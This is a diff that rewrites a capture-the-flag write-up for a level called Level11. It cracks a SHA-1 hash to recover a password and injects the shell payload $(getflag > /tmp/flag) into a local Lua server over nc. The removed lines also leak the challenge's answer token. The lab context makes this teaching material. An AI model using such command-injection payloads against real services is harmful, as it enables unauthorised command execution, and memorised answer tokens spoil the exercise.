@@ -1,10 +1,57 @@
-The lua file is a server asking for a password and comparing its sha1sum to : f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
-=> find the password with that sha1sum by comparing it to a database with https://www.dcode.fr/hash-sha1
-we get => `NotSoEasy`
+# Level11
 
-it doesn't work by imputing the password with ending /n so we can try ```echo -n NotSoEasy | nc localhost 5151``` => doesn't work
-command injection in the echo as previous flag with redirect to file because the output is piped to sha1sum
-We launch the client with ```nc localhost 5151``` and input : $(getflag > /tmp/flag) as password
-=> ```cat /tmp/flag``` gives token : fa6v5ateaw21peobuub8ipe6s
+## Objective
+Exploit the `level11` Lua script to find the correct password by providing its SHA-1 hash. Use command injection to execute `getflag` and retrieve the token.
 
-```su level12```
+## Steps
+
+### Step 1: Find Password for SHA-1 Hash
+Use an online tool or a hash database to find the password corresponding to the given SHA-1 hash (`f05d1d066fb246efe0c6f7d095f909a7a0cf34a0`). The password is `NotSoEasy`.
+
+### Step 2: Test Password Input
+Attempt to input the password using `echo` with and without the newline character:
+
+```bash
+echo -n NotSoEasy | nc localhost 5151
+```
+
+### Step 3: Command Injection
+
+Launch the client:
+
+```bash
+nc localhost 5151
+```
+
+Try command injection by inputting the following password:
+
+```bash
+$(getflag > /tmp/flag)
+```
+
+### Step 4: Obtain Token
+Check the contents of the `/tmp/flag` file:
+
+```bash
+cat /tmp/flag
+```
+
+This should give you the token for `level12`.
+
+### Step 5: Switch to `level12`
+Switch to the `level12` user:
+
+```bash
+su level12
+```
+
+### Step 6: Verify
+Execute `getflag` to verify that you have access:
+
+```bash
+getflag
+```
+
+This should give you the flag for this level.
+
+Congratulations! You've successfully exploited the `level11` Lua script to obtain the token for `level12`.
